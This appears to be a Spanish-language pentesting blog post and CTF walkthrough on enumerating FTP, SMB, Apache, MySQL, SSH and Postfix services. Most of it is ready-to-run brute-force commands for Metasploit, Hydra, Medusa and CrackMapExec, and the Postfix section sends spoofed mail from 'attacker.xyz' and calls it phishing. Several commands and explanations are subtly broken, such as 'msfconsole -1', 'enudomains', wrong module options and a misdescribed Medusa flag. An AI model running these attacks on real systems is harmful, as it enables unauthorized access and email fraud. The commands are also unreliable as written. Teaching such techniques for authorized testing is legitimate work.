---
title: "Enumeración - Cracking de contraseñas"
date: 2026-02-15 16:45:00 -0500
categories: [Hacking, Cracking]
tags: [cracking, enumeración, Nmap, Metasploit, Hydra y CrackMapExec]
description: Cómo enumerar usuarios y crackear contraseñas de servicios vulnerables.
toc: true
---

En este artículo, exploraremos las técnicas y herramientas fundamentales para descubrir hosts activos y enumerar servicios clave como FTP, SMB, Apache, MySQL y SSH. Además, veremos cómo aprovechar esta información para ejecutar ataques de fuerza bruta y cracking de credenciales. Ya sea que estés auditando una red real o practicando en entornos de entrenamiento (CTF), dominar esta metodología es el primer paso para comprometer un sistema.

## Reconocimiento de Windows - NMAP Descubrimiento de Hosts
Lo primero que se debe realizar para un reconocimiento de un equipo, es probar la conectividad con el dispositivo.
```shell
ping dominio.local
```
En caso de **NO TENER PING**, no significa que el dispositivo no sea accesible, puede significar que ICMP se encuentre desactivado o esté en medio de un FireWall.
```shell
nmap -Pn dominio.local
```
Con este comando se puede determinar si el dominio está o no activo, sin necesidad de realizar un ping.
**-Pn** le dice a Nmap que omita la fase de descubrimiento de hosts (ping) y asuma que el objetivo está vivo, lo cual es vital si el servidor bloquea paquetes ICMP.

## Enumeración de servicios FTP
**FTP (*File Transfer Protocol*):** Protocolo estandar que permite transferir archivos entre varios host dentro de una red.

Para este proceso, vamos a analizar toda la información que exponga el servicio FTP. Primero, revisamos la conectividad y confirmamos que el puerto 21 esté abierto:

```shell
ping dominio.local
nmap -p21 dominio.local
```
# Enumeración con Metasploit Framework
Si el puerto está abierto, podemos automatizar la enumeración utilizando Metasploit. Primero, iniciamos el servicio de la base de datos y la consola:

```shell
service postgresql start 
msfdb init
msfconsole -q
```
> Nota
> El parámetro -q (quiet) permite saltarse el banner de inicio de msfconsole para entrar directamente a la herramienta.
{: .prompt-info }

Una vez dentro, es una buena práctica crear un entorno de trabajo (workspace) para mantener nuestros escaneos organizados:

```shell
Workspace
Workspace -a FTP_ENUM
```
# Búsqueda de puertos desde MSF
Podemos realizar el escaneo de puertos directamente desde Metasploit utilizando el módulo de portscan:

```shell
search portscan
use scanner/portscan/tcp
set rhosts dominio.local
run
```
# Detección de la versión de FTP
Conocer la versión exacta del servicio nos permite buscar vulnerabilidades específicas. Buscamos y configuramos el módulo ftp_version:
```shell
search type:auxiliary name:ftp
use scanner/ftp/ftp_version

# setg permite configurar una variable global, lo que significa que todos los RHOSTS van a estar configurados.
setg rhosts dominio.local 
# Permite ver las configuraciones del módulo
show options
run
```

# Fuerza Bruta de Usuarios y Contraseñas
Si el servicio no es vulnerable por su versión, podemos intentar un ataque de diccionario utilizando el módulo ftp_login:
```shell
search type:auxiliary name:ftp
use scanner/ftp/ftp_login

# Configuramos los diccionarios para la fuerza bruta
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlist/unix_users.txt
set USER_PASSFILE /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt
run
```
Finalmente, no olvides revisar si el servidor permite el inicio de sesión anónimo, una mala configuración muy común en entornos reales y CTFs:
```shell
search type:auxiliary name:ftp
use scanner/ftp/anonymous
show options
run
```

## Fuerza Bruta (Hydra)
Hydra se conoce como una herramienta formidable en el arsenal de profesionales de la ciberseguridad y hackers, reconocida por su eficacia en ataques de fuerza bruta. Gracias a sus capacidades versátiles, Hydra puede sondear sistemáticamente las interfaces de inicio de sesión de diversos protocolos y servicios, intentando descifrar contraseñas mediante un exhaustivo método de ensayo y error. Su adaptabilidad abarca un amplio espectro, incluyendo HTTP, HTTPS, FTP, SSH, Telnet, SMTP y numerosos otros mecanismos de autenticación, lo que la convierte en una opción versátil para penetrar en diversos sistemas y aplicaciones.

```shell
hydra -L /usr/share/metasploit-framework/data/wordlist/unix_users.txt -P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt ftp://dominio.local
```

## Fuerza Bruta (Medusa)
Su objetivo es admitir la mayor cantidad posible de servicios que permiten la autenticación remota. 

```shell
medusa -h dominio.local -U /usr/share/metasploit-framework/data/wordlist/unix_users.txt -P /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt ftp://dominio.local -M ftp -t 8 -f

#En donde:
#   -M es el módulo FTP que utiliza.
#   -t son los hilos
#   -f muestra la información de las pruebas en pantalla
```

Una vez que se haya conseguido las credenciales, se procede a realizar la conexión:

```shell
ftp dominio.local
> get archivo.txt
> exit
cat archivo.txt
```
## Búsqueda de vulnerabilidades

Buscar vulnerabilidades con versiones exactas, en caso de no tener resultado, se procede a bajar un nivel de la versión hasta encontrar la vulnerabilidad.

```shell
searchsploit ProFTPD 1.3.5a
searchsploit ProFTPD 1.3.5
```

También se puede realizar una consulta en GOOGLE buscando: *ProFTPD 1.3.5a exploit*

### Material de apoyo
Se puede buscar más comandos en cheatsheet de apoyo como el que les comparto a continuación:
 **[CheatSheet](https://www.stationx.net/nmap-cheat-sheet/)**, **[Hausec](https://hausec.com/pentesting-cheatsheet/#_Toc475368978)**

## Reconocimiento Básico SAMBA (SMB)

Para realizar un reconocimiento básico de SAMBA, se procede mediante msfconsole de la siguiente manera:

```shell
msfconsole -q
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
set rhost 127.0.0.1
run
```
Con estos comandos se puede ver la versión de smb donde la version 1 es la más peligrosa.

```shell
use auxiliary/scanner/smb/smb_enumusers
show options
setg rhosts 127.0.0.1
run
```
Con esto identificamos usuarios que estén creados dentro de SMB

```shell
use auxiliary/scanner/smb/smb_enumshares
run
```
Enumera recursos compartidos que están dentro de SMB

```shell
use auxiliary/scanner/smb/smb_login
show options
set SMBUSER miusuario
set SMBPASS miusuario
```
Se verifica credenciales válidas en SMB.

```shell
smbclient -N -L //127.0.0.1
smbclient //127.0.0.1/foo_share
ls
```
Con smbclient permite conectarse a un recurso compartido, en este caso llamado foo_share, donde se puede ver la información que tiene el recurso.

```shell
smbclient -L 127.0.0.1 -U miusuario
smbclient //127.0.0.1/foo_share -U miusuario
ls
get flag.txt
```
Conexión a SMB con credenciales válidas.

Con los conocimientos previos, se procede a realizar un análisis de un servicio SMB a una máquina con el dominio.local

```shell
nmap -p- dominio.local
nmap -sU --top-ports 15 -T 5 -n -sS dominio.local #Escaneo puertos UDP más comunes
#137 puerto netbios UDP
#139 es NetBIOS sobre TCP
#445 es SMB directo sobre TCP.
```
Para buscar el workgroup de SAMBA se realiza lo siguiente

```shell
crackmapexec smb 10.10.0.0/24 -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success
```
Se hace un escaneo a toda la red, con esto podemos saber los **nombres** de todos los equipos que hay.

```shell
nmap -sV -p 139,445 dominio.local
```
Con el comando de arriba se puede ver el nombre del grupo.

```shell
nmap --script smb-os-discovery -p 139,445 dominio.local 
```
Permite saber la verion de smb que está corriendo con nmap. También se puede hacer con el módulo de SMB_Version de metasploit.

```shell
nmblookup -A dominio.local 
```
Para saber el nombre del equipo, aunque es mejor crackmapexec.

```shell
smbclient -L dominio.local -N
```

Para ver recursos compartidos de forma anónima.

```shell
smbclient //dominio.local/public -N 
```
En caso de no haber contraseña se puede conectar de forma anónima.

```shell
rpcclient -U ""  -N dominio.local
help #para mostrar ayuda
enudomains #ver dominios
enumdomusers #buscar usuarios
```
Permite ver conexiones anónimas

Luego de encontrar usuarios activos, se puede buscar las contraseñas con fuerza bruta creando un diccionario.

```shell
echo -e "john\nelie\naisha\nshawn\nemma\nadmin" > users.txt #\n permite dar el salto de linea, se pone todo unido para que no haya espacios en blanco al dar el salto.

msfconsole -q
use scanner/smb/smb_login
set rhost dominio.local
set USER_FILE /home/users.txt
set PASS_FILE /usr/share/wordlist/rockyou.txt #gzip -d rockyou.txt.gz (Para descomprimir el diccionario)
run
```
Con esto se ejecuta fuerza bruta para encontrar las credenciales.


## Enumeración de Apache.

La enumeración es un paso crucial en el reconocimiento de enumeración, donde el objetivo es encontrar toda la información posible para encontrar fallos de seguridad que pueden ser explotados. 
Entre los módulos más utilizados de msfconsole están los siguientes:

A continuación se detallan los módulos de la suite Metasploit para la fase de reconocimiento sobre servicios HTTP:

* **`auxiliary/scanner/http/apache_userdir_enum`** Enumera nombres de usuario en servidores Apache que tienen habilitado el módulo `mod_userdir`.
* **`auxiliary/scanner/http/brute_dirs`** Realiza fuerza bruta para identificar directorios ocultos mediante el uso de diccionarios.
* **`auxiliary/scanner/http/dir_scanner`** Escanea directorios comunes conocidos para identificar la estructura del sitio.
* **`auxiliary/scanner/http/dir_listing`** Verifica si el servidor permite el listado de directorios, lo que podría exponer archivos sensibles.
* **`auxiliary/scanner/http/http_put`** Prueba si el método HTTP `PUT` está activo, permitiendo potencialmente la subida de archivos maliciosos.
```shell
set PATH /data
set FILENAME text.txt
set FILEDATA "Welcome to AttackDefense"
```
* **`auxiliary/scanner/http/files_dir`** Busca archivos específicos dentro de los directorios ya identificados. 
```shell
set DICTIONARY /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
* **`auxiliary/scanner/http/http_login`** Ejecuta ataques de fuerza bruta contra sistemas de autenticación HTTP (Basic o Digest).
* **`auxiliary/scanner/http/http_header`** Extrae y analiza las cabeceras HTTP para obtener información del software y servidor.
* **`auxiliary/scanner/http/http_version`** Identifica la versión exacta del servidor web para buscar vulnerabilidades específicas.
* **`auxiliary/scanner/http/robots_txt`** Analiza el archivo `robots.txt` en busca de rutas restringidas que el administrador intenta ocultar.

> [TIP]
> Recuerda configurar siempre el `RHOSTS` y el `RPORT` antes de ejecutar `run` en msfconsole.
{: .prompt-warning }


## Enumeración MySQL

Módulos diseñados para interactuar con instancias de MySQL, desde la identificación de versiones hasta la extracción de datos.

```shell
mysql -h dominio.local -u root -p
show databases;
use mysql;
show tables;
select * FROM users;
```
* **`auxiliary/scanner/mysql/mysql_version`**: Determina la versión exacta del servicio MySQL.
* **`auxiliary/scanner/mysql/mysql_login`**: Realiza ataques de fuerza bruta sobre el protocolo de autenticación de MySQL.
* **`auxiliary/admin/mysql/mysql_enum`**: Extrae información detallada de la configuración, usuarios y privilegios.
* **`auxiliary/admin/mysql/mysql_sql`**: Permite ejecutar sentencias SQL de forma remota (requiere credenciales).
* **`auxiliary/scanner/mysql/mysql_file_enum`**: Intenta listar archivos en el sistema operativo mediante funciones de MySQL (si tiene permisos).
* **`auxiliary/scanner/mysql/mysql_hashdump`**: Extrae los hashes de las contraseñas de los usuarios de la base de datos para su posterior crackeo.
* **`auxiliary/scanner/mysql/mysql_schemadump`**: Descarga la estructura (esquema) de todas las bases de datos y tablas.
* **`auxiliary/scanner/mysql/mysql_writable_dirs`**: Identifica si hay directorios en el sistema de archivos donde el servicio MySQL puede escribir.

> [!WARNING]
> El uso de módulos de fuerza bruta como `mysql_login` puede causar el bloqueo de cuentas si existe una política de seguridad activa en el servidor.
{: .prompt-warning }

> [!TIP]
> Para los módulos de MySQL, si ya has obtenido una sesión o credenciales, `mysql_schemadump` es vital para entender la estructura de la información antes de realizar un exfiltrado de datos.
{: .prompt-tip }


## Login SSH

```shell
ping -c 4 dominio.local
nmap -sS -sV dominio.local
msfconsole -1

use auxiliary/scanner/ssh/ssh_version
set RHOSTS dominio.local
run

use auxiliary/scanner/ssh/ssh_login
set RHOSTS dominio.local
set USER_FILE /usr/share/metasploit-frameworl/data/wordlists/coommon_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_password.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run

##Conexión a SSH

sessions
sessions -i 1
find / -name "flag"
cat /flag
```

## Reconocimiento básico de POSTFIX 

Comandos para saber cómo funciona POSTFIX y realizar un PISHING.

```shell
nmap -sV -script banner dominio.local
nc dominio.local 25
VRFY admin@openmailbox.xyz
telnet dominio.local 25
HELO attacker.xyz
EHLO attacker.xyz

smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t dominio.local

msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS dominio.local
run

telnet dominio.local
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.

sendmail -f admin@attacker.xyz -t root@openmailbox.xyz -s dominio.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

## Caso práctico: Fase de Enumeración en Entornos de Entrenamiento (CTF)

Este laboratorio se centra en técnicas de enumeración para identificar y analizar servicios en ejecución en una máquina Linux objetivo. Nuestro propósito es explorar e interactuar con estos servicios para descubrir y capturar las banderas (*flags*) ocultas. Aplicaremos nuestros conocimientos para identificar configuraciones incorrectas, credenciales débiles y posibles vulnerabilidades.

### Flag 1: Acceso Anónimo en Samba
> **Pista:** Hay un recurso compartido de Samba que permite el acceso anónimo. ¡Me pregunto qué habrá ahí dentro!
{: .prompt-info }

Para empezar a buscar esta primera bandera, lo ideal es realizar un escaneo de puertos y servicios sobre nuestro objetivo para saber a qué nos enfrentamos:

```shell
nmap -p- -sV dominio.local
```
Supongamos que el escaneo nos devuelve los siguientes puertos abiertos:
```shell
PORT        SERVICE
22/tcp      ssh
139/tcp     netbios-ssn (Samba)
445/tcp     netbios-ssn (Samba)
5554/tcp    ftp
```
Al notar que el puerto 445 (SMB) está abierto, procedemos a enumerar los recursos compartidos y los usuarios del host utilizando enum4linux:

```shell
enum4linux -s /root/Desktop/wordlists/shares.txt dominio.local
```

Si descubrimos un recurso llamado pubfiles que permite acceso anónimo, nos conectamos a él directamente con smbclient:
```shell
smbclient //dominio.local/pubfiles
> ls
> get flag
> exit
```

### Flag 2: Fuerza Bruta en SMB
>**Pista:** Uno de los usuarios de Samba tiene una contraseña débil. ¡Su recurso compartido privado (con el mismo nombre que su usuario) está en riesgo!
{: .prompt-info }

Basándonos en los usuarios que pudimos haber enumerado en el paso anterior, creamos un diccionario personalizado:

```shell
echo "josh\nbob\nnancy\nalice" > users.txt
```
Luego, utilizamos crackmapexec junto con un diccionario conocido (como rockyou.txt o unix_passwords.txt) para realizar un ataque de fuerza bruta sobre el servicio SMB:

```shell
crackmapexec smb dominio.local -u users.txt -p /root/Desktop/wordlists/unix_passwords.txt --shares --continue-on-success
```
Imaginemos que obtenemos un resultado exitoso para el usuario josh. Nos conectamos a su recurso compartido privado para capturar la bandera:

```shell
smbclient //dominio.local/josh -U josh
> ls
> flag2
> get 
> exit
```
Al leer el contenido de la flag2, podríamos encontrarnos con un mensaje oculto:

```shell
cat flag2
#Escuché que hay un servicio FTP corriendo, revisa y chequea el banner
```

### Flag 3: Enumeración de FTP en puerto no estándar
>**Pista:** Sigue la pista dada en la bandera anterior para descubrir esta.
{: .prompt-info }

El mensaje anterior nos indica que debemos revisar el servicio FTP. Según nuestro escaneo inicial con Nmap, el FTP no está en el puerto 21 habitual, sino en el 5554.

Primero, creamos un nuevo diccionario de posibles usuarias si hemos recopilado más nombres durante nuestra enumeración:
```shell
echo -e "alice\namanda\nashley" > users2.txt
```
Atacamos el servicio FTP en ese puerto específico utilizando hydra:
```shell
hydra -L users2.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://dominio.local:5554
```
Una vez que hydra nos devuelva credenciales válidas (por ejemplo, alice), iniciamos sesión para obtener la tercera bandera:

```shell
ftp dominio.local -p 5554
#Ingresamos el usuario alice y su contraseña pretty
> ls
> flag3
> get flag3
> exit
```
### Flag 4: Banners y SSH
>**Pista:** Esta es una advertencia destinada a disuadir a los usuarios no autorizados de iniciar sesión.
{: .prompt-info }

La pista nos habla de "advertencias al iniciar sesión". Esto es una clara referencia a los banners de bienvenida de los servicios, especialmente SSH.

Para capturar esta última bandera, simplemente intentamos conectarnos por SSH o usamos netcat para capturar el banner del puerto 22:

```shell
ssh dominio.local
# En el texto del banner de advertencia (Message of the Day o MOTD) estará la FLAG 4.
```

## Conclusión

Como hemos visto a lo largo de este artículo, la enumeración es el pilar fundamental de cualquier auditoría de seguridad o prueba de penetración exitosa. No se trata simplemente de lanzar escaneos automatizados a diestra y siniestra, sino de aplicar una metodología estructurada para entender qué servicios están corriendo, cómo interactúan entre sí y qué pequeñas configuraciones erróneas podemos aprovechar.

Herramientas como Nmap, Metasploit, Hydra y CrackMapExec son excelentes aliadas en nuestro arsenal, pero la verdadera habilidad de un auditor reside en la paciencia y en el análisis meticuloso de cada pedazo de información obtenida (como un simple banner de bienvenida o un recurso compartido anónimo).

Recuerda que la constancia y la práctica son claves en este campo. Te animo a seguir perfeccionando estas técnicas de reconocimiento en entornos controlados, laboratorios y CTFs, siempre manteniendo un enfoque ético. 

¡Espero que esta guía te sirva como referencia rápida en tus futuros escaneos! Nos leemos en el próximo post.